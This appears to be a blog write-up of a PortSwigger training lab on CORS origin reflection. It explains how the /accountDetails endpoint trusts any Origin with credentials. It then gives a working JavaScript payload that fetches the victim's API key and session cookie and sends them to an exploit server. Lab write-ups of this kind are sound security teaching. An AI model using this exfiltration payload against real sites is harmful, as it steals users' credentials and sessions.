+++
date = '2026-07-07T09:43:16+08:00'
draft = false
title = "CORS vulnerability with basic origin reflection | <span style=\"color:#2ecc71\">Apprentice</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
Our goal is to obtain the API key of `administrator`, so first we have to see how it is returned in the response:
![](/images/viber_image_2026-07-07_09-36-05-549.png)
The web application fetches the endpoint `/accountDetails` including the user's credentials. It then queries for `apiKey` and reflects it in the HTML. This sounds interesting, let's dive in for more!
![](/images/viber_image_2026-07-07_09-36-48-853.png)
The backend returns with a clean JSON object containing our apikey **and** session cookie as well, this smells privacy issues. Not only that the web application responds with the `Access-Control-Allow-Credentials` header set to True, meaning CORS may be supported and credentials are included in requests *for the same origins at least*. Let's try spoofing the Origin header and see what's up:
![](/images/viber_image_2026-07-07_09-37-27-683.png)
Surprisingly, the backend never bothers validating origin and just appends them blindly into the `Access-Control-Allow-Origin` header, not only that but we are also allowed to send credentials into our requests as well. This opens up opportunities for a CORS exploit on the `/accountDetails` endpoint, but we forgot to check whether the session cookie is Strict or not. Let's try:
![](/images/viber_image_2026-07-07_09-40-12-824.png)
Thankfully, the session cookie is set to None, and since our original request does not have CSRF tokens, we can craft the following payload:
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://<lab-id>.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://<exploit-server>/exploit?key='+this.responseText;
    };
</script>
```
Upon delivering the payload to our victim, we can immediately see all those juicy credentials our log has captured. Decoding them will yield the apiKey of `admin` as well as the session cookies too. Neat:
![](/images/viber_image_2026-07-07_09-41-39-561.png)
![](/images/viber_image_2026-07-07_09-42-02-668.png)